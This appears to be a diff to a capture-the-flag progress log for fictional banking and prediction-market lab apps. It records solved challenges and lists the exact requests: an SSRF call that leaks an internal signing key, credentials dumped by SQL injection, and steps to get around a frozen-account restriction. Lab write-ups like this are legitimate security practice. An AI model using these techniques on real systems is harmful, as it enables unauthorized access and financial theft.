@@ -39,8 +39,9 @@
 | A Verdict Never Spoken | Octopus | 400 | Settled an OPEN/unresolved market via `POST /api/oracle/markets/{id}/settle` before its natural close |
 | The Seer's Sigil | Octopus | 300 | Hardcoded rehearsal resolver token in JS DOM comment → `POST /api/oracle/markets/1200/resolve` with `X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d` |
 | A Foregone Prophecy | Octopus | 280 | Create market with `closesAt` in past → resolve with seer token → settle → payout (past date accepted without server-side validation) |
+| Inside Line | Hippo | 300 | SSRF via `/api/partner-banks/{id}/discover` to `dmlink-config.internal` → JSON response contains `link_signing_key: D3E346z93-ecbT72d2c9a66e` → submitted to crwd-ctrl SUBMIT form |
 
-**Total earned: 5090 pts**
+**Total earned: 5390 pts**
 
 ---
 
@@ -156,16 +157,33 @@
 - **Tried:** @-bypass with localhost → returns `outcome: NO` (server fetches something, but not crwd-ctrl detected)
 - **Missing:** May need the server to actually hit an internal URL that returns a flag, similar to the SSRF challenges
 
-### Frozen Assets (Alpaca)
+### Inside Line — 300 pts ✅
+- **Vulnerability:** SSRF → credential leak from internal config service
+- **Exact request:** `POST /api/partner-banks/1/discover` with `{"discoveryHost":"dmlink-config.internal"}`
+- **Response:** `{"link_signing_key":"D3E346z93-ecbT72d2c9a66e", ...}`
+- **Submission:** Submitted `D3E346z93-ecbT72d2c9a66e` to crwd-ctrl SUBMIT form under "Signing Key" field (+300 pts)
+
+### Frozen Assets (Alpaca) — IN PROGRESS
 - **Vector:** Bypass UI restriction to fund bill payment from frozen account
 - **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
 - **Target account:** DMACC1005 (user 5's LOCKED account, balance $101,920)
 - **Problem:** `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` returns 400 "Account DMACC1005 is not owned or linked by amorgan"
-- **Options to try:**
-  1. First link DMACC1005 to our account via `/api/linked-accounts`
-  2. Find a hidden "admin" override or account transfer endpoint
-  3. Use JWT signing key to forge a token as user 5 and make payment that way
-  4. Try SSRF or parameter pollution to bypass ownership check
+- **Partner bank auth flow discovered:**
+  - `POST /api/partner-banks/{id}/auth` with `{username, password}` → returns `linkToken` (JWT, iss: "darkmoney-partner-bank")
+  - Token passed as `Authorization: Bearer <token>` to `GET /api/partner-banks/{id}/accounts`
+  - `POST /api/linked-accounts` with `{partnerBankAccountId, nickname, linkToken}` creates linked account with shadow DM account number (DMACCEXT*)
+- **Credentials found via SQLi on `partner_bank_user` table:**
+  - `atlantis.customer:Tr1ton&Reef2026` (IDs 1–2: ATL10024021 checking $8k, ATL10029930 savings $4.2k)
+  - `atlantis.h1pp0:7e3023bfc3bb1666fe3a0e76` (ID 3: ATL10037431 checking $6.3k)
+  - `gross.notional:Pr3z1si0n#GN26`
+  - `konza.member:Pra1ri3$Konza7`
+  - `fu.exchange:W1re&Underw00d8`
+  - `sovereign.holder:D1scr33t$SUD19`
+  - `gilded.trust:G0ld3n@Reserve4`
+  - `sylvan.member:C0mmun1ty&Sylv0`
+- **Linked h1pp0's ATL10037431 to Alice** → shadow account DMACCEXT0008 created (ACTIVE, $6.3k)
+- **Still failing:** `fromAccountNumber: "DMACC1005"` still returns "not owned or linked" even after linking h1pp0's Atlantis account
+- **Next:** Try paying from DMACCEXT0008 or ATL10037431 account numbers, or find which account maps to the $101,920 balance
 
 ---
 
@@ -175,7 +193,7 @@ Additional challenges are still locked (unlock by completing prerequisites):
 - Trex: 3 locked challenges
 - Alpaca: 3 locked challenges
 - Octopus: 1 locked challenge (after Seer's Sigil — now unlocked: A Foregone Prophecy, Author of the Verdict, A Runner Misdirected)
-- Hippo: 2 locked challenges
+- Hippo: 1 locked challenge (Inside Line completed; The Name Checks Out, The Number Checks Out remain)
 
 ---
 
